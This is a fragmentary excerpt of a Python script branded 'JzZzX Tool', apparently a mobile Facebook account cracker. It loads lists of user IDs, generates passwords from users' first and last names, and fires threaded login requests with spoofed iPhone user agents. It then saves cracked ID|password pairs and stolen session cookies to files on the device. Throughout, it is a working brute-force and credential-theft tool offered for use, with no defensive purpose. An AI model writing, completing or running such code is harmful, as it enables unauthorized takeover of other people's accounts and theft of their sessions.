...
def compare_phone_time():
    try:
        ...
        print(f"JzZzX Fix This Shitty Tool")
compare_phone_time()
import datetime;now = datetime.date.today();target = datetime.date(2024,9,20)
if now >=target:print("═════════•°• JzZzX TooL •°•═════════")
else:print("═════════•°• JzZzX TooL •°•═════════")
def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
...
print('\n\033[1;37m You Have Been Join Successfully To JzZzX Tool ')
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/@JZZZX.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;35m [01] \x1b[1;92S Select Path File :')
                        linex()
                        xd=input('\033[1;96mChoose  \033[1;94m: ')
                        if xd in ['1','01']:
                               
                                clear()
                                file = input('\033[1;92mAdd File Path :  \033[1;94m: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' \x1b[1;92m[01] \x1b[1;92mMethod :')
                                linex()
                                mthd=input('\033[1;96mChoose \033[1;94m: ')
                                clear()
                                plist = []
                                print(('\033[92m—'*25)+'\n•═════════•°• JzZzX •°•═════════•\n'+('—'*25))
                                print('\x1b[1;92m [01] \x1b[1;31mFast PassWords \n\x1b[1;92m [02] \x1b[1;33mManuel Passwords  \n\x1b');linex()
                                ppp=input('\033[1;96mChoose  \033[1;94m: ')
                                if ppp in ['1','01']:
                                        plist.append('first1919')
                                        plist.append('first1920')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print('\x1b[1;33mWaiting For Complete The Examination  \033[1;94m: \033[1;96m'+total_ids)
                                        print("\033[1;32m ═════════•°• JzZzX •°•═════════ ")
                                        linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m•°• JzZzX •°•[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        ASX=session.cookies.get_dict().keys()
                        if "c_user" in ASX:
...
═════════•°• JzZzX •°•═════════	
				''')
                                ...
                                open(f'/sdcard/JZZZX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
═════════•°• JzZzX •°•═════════	
				''')    
                                        ...
                                        open(f'/sdcard/JZZZX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m [@JZZZX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
		...
		•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
          ...
          ═════════•°• JzZzX •°•═════════
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [@JZZZX-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/JZZZX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@JZZZX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/JZZZX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open(f'/sdcard/JZZZXCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@JZZZX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open(f'/sdcard/JZZZX-COOKIE.txt','a').write(coki+'\n')
                                        open(f'/sdcard/JZZZX_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@JZZZXCP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/JZZZX-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
